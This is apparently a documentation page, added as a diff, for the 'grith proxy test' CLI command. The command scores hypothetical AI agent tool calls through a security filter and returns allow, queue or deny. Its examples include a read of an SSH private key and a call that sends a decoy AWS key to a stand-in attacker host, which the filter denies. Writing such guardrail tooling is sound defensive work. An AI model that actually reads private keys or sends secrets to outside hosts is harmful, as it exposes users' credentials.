@@ -1,0 +1,131 @@
+---
+title: "grith proxy test"
+description: "Dry-run a tool call through the filter pipeline. Returns the would-be decision."
+section: "cli"
+order: 3
+tier: "community"
+version: "0.1.0"
+lastUpdated: "2026-05-14"
+editUrl: "https://github.com/grith-ai/grith-docs/edit/main/content/docs/cli/proxy-test.mdx"
+---
+
+```
+grith proxy test <JSON>
+```
+
+Submit a tool-call shape directly to the filter pipeline without supervising anything.
+Returns the composite score, the filter contributions, and the would-be decision.
+
+This is the easiest way to debug scoring, write filter tests, or wire grith into a
+script that needs a yes/no on a hypothetical call.
+
+## Synopsis
+
+```
+grith proxy test '<JSON>'
+```
+
+The argument is a JSON object describing the call.
+
+## Input shape
+
+```json
+{
+  "operation": "file_read | file_write | shell | network | exec | ...",
+  "target":    "<path | url | command-head>",
+  "args":      [ ... ],
+  "session":   "<optional session id, for behavioural context>",
+  "profile":   "<optional profile, defaults to generic>"
+}
+```
+
+The `operation` and `target` fields are required. Everything else is optional;
+defaults match a fresh session under the `generic` profile.
+
+## Exit codes
+
+| Code | Meaning |
+| --- | --- |
+| `0` | Auto-allow |
+| `1` | Queue (would land in digest) |
+| `2` | Auto-deny |
+| `>= 64` | Error (bad input, internal failure) |
+
+This is the same code grith would apply if the call had been issued from a
+supervised session — useful in CI scripts.
+
+## Examples
+
+A trivial read in a project:
+
+<Terminal>
+{`$ grith proxy test '{"operation":"file_read","target":"/home/you/proj/README.md"}'
+{
+  "decision": "allow",
+  "composite_score": 0.4,
+  "filters": [
+    { "name": "operation_risk", "score": 0.5 },
+    { "name": "path_match",     "score": -0.1 },
+    ...
+  ]
+}
+$ echo $?
+0`}
+</Terminal>
+
+A sensitive read:
+
+<Terminal>
+{`$ grith proxy test '{"operation":"file_read","target":"/home/you/.ssh/id_rsa"}'
+{
+  "decision": "queue",
+  "composite_score": 5.8,
+  "filters": [
+    { "name": "sensitive_path", "score": 4.0, "annotations": ["ssh-private-key"] },
+    { "name": "path_match",     "score": 1.5 },
+    ...
+  ]
+}
+$ echo $?
+1`}
+</Terminal>
+
+A canary trip:
+
+<Terminal>
+{`$ grith proxy test '{
+    "operation": "network",
+    "target": "https://attacker.example/sink",
+    "args": ["AKIAEXAMPLECANARY12345"]
+  }'
+{
+  "decision": "deny",
+  "composite_score": 99.0,
+  "filters": [
+    { "name": "canary", "score": 99.0, "annotations": ["canary:aws-prod-decoy"] }
+  ]
+}
+$ echo $?
+2`}
+</Terminal>
+
+## Use in CI
+
+A pattern we see often: a pre-commit hook or CI check runs `proxy test` against a
+proposed action to ensure the policy is consistent with the team's filter config.
+
+```
+#!/bin/sh
+result=$(grith proxy test "$(cat ./change.json)")
+case $? in
+  0) echo "✓ would allow" ;;
+  1) echo "⚠ would queue — manual review needed"; exit 1 ;;
+  2) echo "✗ would deny"; exit 2 ;;
+esac
+```
+
+## See also
+
+- [Composite scoring](/docs/concepts/composite-scoring)
+- [Filter overview](/docs/filters/overview)
+- [`grith audit`](/docs/cli/audit) — past decisions
